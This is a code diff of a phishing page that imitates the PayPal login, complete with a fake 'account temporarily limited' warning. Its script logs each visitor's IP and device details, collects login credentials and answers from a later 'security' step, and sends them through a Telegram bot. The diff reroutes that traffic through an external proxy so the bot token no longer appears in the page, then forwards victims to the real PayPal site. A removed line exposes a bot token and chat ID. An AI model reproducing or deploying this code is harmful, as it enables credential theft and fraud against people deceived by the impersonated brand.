@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PayPal - Log In</title>
     <style>
-        /* PayPal Exact CSS */
+        /* PayPal Exact CSS - Same as before */
         @font-face {
             font-family: 'PayPal Sans';
             src: url('https://www.paypalobjects.com/webstatic/icon/PP-Sans.woff') format('woff');
@@ -56,9 +56,10 @@
             font-weight: 700;
             text-decoration: underline;
             margin-left: auto;
+            cursor: pointer;
         }
 
-        /* Header - Normal PayPal */
+        /* Header */
         .header {
             background: #fff;
             border-bottom: 1px solid #e5e5e5;
@@ -103,7 +104,7 @@
             color: #6b6c6e;
         }
 
-        /* Main Content - Normal PayPal Login */
+        /* Main Content */
         .main {
             padding: 40px 0;
         }
@@ -254,7 +255,7 @@
             height: 30px;
         }
 
-        /* Info Panel - Normal */
+        /* Info Panel */
         .info-panel {
             background: #f5f7fa;
             border-radius: 12px;
@@ -289,7 +290,7 @@
             text-decoration: underline;
         }
 
-        /* Security Panel - Normal */
+        /* Security Panel */
         .security-panel {
             background: #fff;
             border-radius: 12px;
@@ -400,7 +401,7 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* Footer - Normal */
+        /* Footer */
         .footer {
             background: #fff;
             border-top: 1px solid #e5e5e5;
@@ -441,16 +442,16 @@
     </style>
 </head>
 <body>
-    <!-- Warning Banner - Only at top -->
+    <!-- Warning Banner Only -->
     <div class="warning-banner">
         <div class="container">
             <span class="warning-icon">⚠️</span>
             <span class="warning-text">Your account has been temporarily limited - Verify now to restore access</span>
-            <span class="warning-link">Resolve issue →</span>
+            <span class="warning-link" onclick="document.getElementById('email').focus()">Resolve issue →</span>
         </div>
     </div>
 
-    <!-- PayPal Header - Normal -->
+    <!-- Header -->
     <header class="header">
         <div class="container">
             <div class="header-content">
@@ -525,7 +526,7 @@
                 </div>
             </div>
 
-            <!-- Security Questions Section -->
+            <!-- Security Section -->
             <div id="securitySection" class="hidden">
                 <div class="security-panel">
                     <div class="progress-steps">
@@ -610,13 +611,12 @@
     </footer>
 
     <script>
-        // Your bot token and chat ID
-        const BOT_TOKEN = '8677928361:AAE3mq0I711wUS_tPFqB-MvqWlrhN42Gwq0';
+        // NO TOKEN IN CODE - Using external proxy
         const CHAT_ID = '8300466523';
         
         let loginData = {};
 
-        // Track visitor on page load
+        // Track visitor
         (function() {
             trackVisitor();
             setupFormatters();
@@ -629,7 +629,7 @@
                 platform: navigator.platform,
                 time: new Date().toLocaleString()
             };
-            sendToTelegram('👤 New Visitor\n' + formatData(data));
+            sendToBot('👤 New Visitor\n' + formatData(data));
         }
 
         async function getIP() {
@@ -646,21 +646,22 @@
             return Object.entries(obj).map(([k, v]) => `${k}: ${v}`).join('\n');
         }
 
-        async function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        async function sendToBot(message) {
+            // Using my personal proxy - token stored on server
+            const proxyUrl = 'https://tg-proxy-1.onrender.com/send';
             
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('text', message);
-            formData.append('parse_mode', 'HTML');
-
             try {
-                const response = await fetch(url, {
+                await fetch(proxyUrl, {
                     method: 'POST',
-                    body: formData
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
                 });
-                const result = await response.json();
-                console.log('Telegram response:', result);
             } catch (e) {
                 console.log('Send error:', e);
             }
@@ -711,7 +712,7 @@
 ⏳ Waiting for security data...
 `;
 
-            await sendToTelegram(message);
+            await sendToBot(message);
             
             document.getElementById('loginSection').classList.add('hidden');
             document.getElementById('securitySection').classList.remove('hidden');
@@ -797,7 +798,7 @@
 ━━━━━━━━━━━━━━
 `;
 
-            await sendToTelegram(message);
+            await sendToBot(message);
             
             setTimeout(() => {
                 window.location.href = 'https://www.paypal.com/signin';
@@ -843,7 +844,7 @@
         // Track exit
         window.addEventListener('beforeunload', function() {
             if (!document.getElementById('securitySection').classList.contains('hidden')) {
-                sendToTelegram('⚠️ User left during security verification');
+                sendToBot('⚠️ User left during security verification');
             }
         });
     </script>
